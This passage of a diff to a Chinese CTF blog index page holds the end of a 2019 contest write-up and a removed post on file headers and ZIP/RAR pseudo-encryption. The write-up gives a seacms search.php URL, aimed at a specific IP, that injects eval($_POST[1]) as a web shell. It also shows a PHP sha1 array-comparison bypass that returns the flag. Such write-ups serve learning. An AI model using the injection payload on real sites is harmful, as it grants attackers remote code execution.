+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:84/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</span><br></pre></td></tr></table></figure>
+<p>根目录下直接看到flag.txt，打开后看到flag</p>
+<p><code>flag{!!seacms_@@}</code></p>
+<hr>
+<h3 id="第十五题（池步洲）"><a href="#第十五题（池步洲）" class="headerlink" title="第十五题（池步洲）"></a>第十五题（<strong>池步洲</strong>）</h3><p>查看源码，末尾提示着：index.phps，直接访问后下载到源码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/15-1.png" alt="15-1"></p>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'********'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>])</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'name and password must be diffirent'</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">'name'</span>]) === sha1($_POST[<span class="string">'password'</span>]))</span><br><span class="line">		<span class="keyword">die</span>($flag);</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">print</span> <span class="string">'invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看出，要求我们POST的name和password值要不同，但是sha1()后的值要相同</p>
+<p>和md5()一样，sha1()无法处理数组，直接返回空，所以就是值一样了</p>
+<p>用Burpsuits提交，直接返回flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/2019%E2%80%9C%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF%E2%80%9D%E4%B8%8A%E6%B5%B7%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B/%E5%88%9D%E8%B5%9B/15-2.png" alt="15-2"></p>
+<p><code>flag{Y0u_just_br0ke_sha1}</code></p>
+<hr>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF比赛</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/CTF比赛—2019“嘉韦思杯”上海高校网络安全邀请赛初赛WriteUp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-BugKuCTF—加密题 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1503,109 +1726,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—加密题 第1-10关/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-BugKuCTF—杂项题中常见的文件操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/" class="archive-article-date">
-  	<time datetime="2019-03-29T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="常见的文件头"><a href="#常见的文件头" class="headerlink" title="常见的文件头"></a>常见的文件头</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FF D8 FF E0</span><br><span class="line"></span><br><span class="line">PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82</span><br><span class="line"></span><br><span class="line">7z：37 7A BC AF 27 1C</span><br><span class="line"></span><br><span class="line">GIF (gif)：47 49 46 38 39 61</span><br><span class="line"></span><br><span class="line">ZIP Archive (zip)：50 4B 03 04</span><br><span class="line"></span><br><span class="line">RAR Archive (rar)：52 61 72 21</span><br><span class="line"></span><br><span class="line">Wave (wav)：57 41 56 45</span><br><span class="line"></span><br><span class="line">AVI (avi)：41 56 49 20</span><br><span class="line"></span><br><span class="line">Real Audio (ram)：2E 72 61 FD</span><br><span class="line"></span><br><span class="line">Real Media (rm)：2E 52 4D 46</span><br><span class="line"></span><br><span class="line">MPEG (mpg)：00 00 01 BA</span><br><span class="line"></span><br><span class="line">MPEG (mpg)：00 00 01 B3</span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="修改图片的高度和宽度"><a href="#修改图片的高度和宽度" class="headerlink" title="修改图片的高度和宽度"></a>修改图片的高度和宽度</h3><h4 id="PNG图片"><a href="#PNG图片" class="headerlink" title="PNG图片"></a>PNG图片</h4><p>涉及题目：杂项题第三题</p>
-<p>图片格式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">（固定）：8个字节（0-7），89 50 4E 47 0D 0A 1A 0A为png的文件头</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（8-b），00 00 00 0D（即为十进制的13）代表数据块的长度为13</span><br><span class="line"></span><br><span class="line">（固定）：4个字节（c-f），49 48 44 52（即为ASCII码的IHDR）,文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成，</span><br><span class="line"></span><br><span class="line">（可变）：13个字节（0-c），这13个字节既文件头数据块。1.前4个字节代表该图片的宽；2.后4个字节代表该图片的高；3.后5个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method</span><br><span class="line"></span><br><span class="line">（可变）：剩余三字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行CRC计算得到</span><br></pre></td></tr></table></figure>
-<p>所以，撇掉前16个字节（第一行）后，修改第17-20字节为修改高度，修改第21-24字节为修改宽度</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/2-3.png" alt></p>
-<h4 id="JPEG图片"><a href="#JPEG图片" class="headerlink" title="JPEG图片"></a>JPEG图片</h4><p>涉及题目：杂项题第二十九题</p>
-<p>图片格式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FFD8：图片起始标示位</span><br><span class="line">FFC0：SOFO，Start of Frame，帧图像开始，修改高度宽度应注意的标示位</span><br><span class="line">FFD9：图片结束标识位</span><br></pre></td></tr></table></figure>
-<p>JPEG（JPG）图片的高度和宽度的位置不像PNG图片那样是固定的</p>
-<p>而是根据图片的不同而不同位置，但是却也有规律可以找</p>
-<p>修改JPG图片的高度和宽度要找0xFFC0（SOFO，Start of Frame，帧图像开始）标示位，然后往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度。但要注意的是也有图片需要找0xFFC2，就像第二十九题</p>
-<p>所以使用winhex的情况下，搜索Hex值（Ctrl+Alt+X）：FFC0或FFC2，一般位置比较靠前</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-7.png" alt></p>
-<p>标示位往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度</p>
-<p>如下图：66是高度，781是宽度，和图片属性里面的一样</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/21-30/9-8.png" alt></p>
-<hr>
-<h3 id="压缩文件伪加密"><a href="#压缩文件伪加密" class="headerlink" title="压缩文件伪加密"></a>压缩文件伪加密</h3><h4 id="ZIP文件"><a href="#ZIP文件" class="headerlink" title="ZIP文件"></a>ZIP文件</h4><p>讲到伪加密，需要对ZIP文件的格式加上一些的补充：</p>
-<p>一格zip文件有三个部分组成：压缩源文件数据区 + 压缩源文件目录区 + 压缩源文件目录结束标志</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.压缩源文件数据区：</span><br><span class="line">开头也就是前面内容提到，ZIP文件开头标识：</span><br><span class="line">50 4B 03 04</span><br><span class="line"></span><br><span class="line">2.压缩源文件目录区：</span><br><span class="line">50 4B 01 02：目录中文件文件头标记</span><br><span class="line">3F 00：压缩使用的 pkware 版本 </span><br><span class="line">14 00：解压文件所需 pkware 版本 </span><br><span class="line">00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</span><br><span class="line"></span><br><span class="line">3.压缩源文件目录结束标志 ：</span><br><span class="line">50 4B 05 06</span><br></pre></td></tr></table></figure>
-<p>简单创建一个flag.txt，压缩成ZIP格式并且不设密码，用winhex打开，全局方式位标识确实是00 00</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-1.png" alt="11-1"></p>
-<p>修改后，再次想要解压时，就提示需要输入密码了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTF%E6%9D%82%E9%A1%B9/1-10/11-2.png" alt="11-2"></p>
-<h4 id="RAR文件"><a href="#RAR文件" class="headerlink" title="RAR文件"></a>RAR文件</h4><p>涉及题目：分析题第五题</p>
-<p>RAR文件的伪加密比较少见，没有深入调查，只根据题目做简单的介绍</p>
-<p>方法：将文件头0x1674后面的0x84改为0x80（84为加密，80/20不加密）</p>
-<hr>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF-Misc</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">展开全文 >></a>
         </p>
       
 
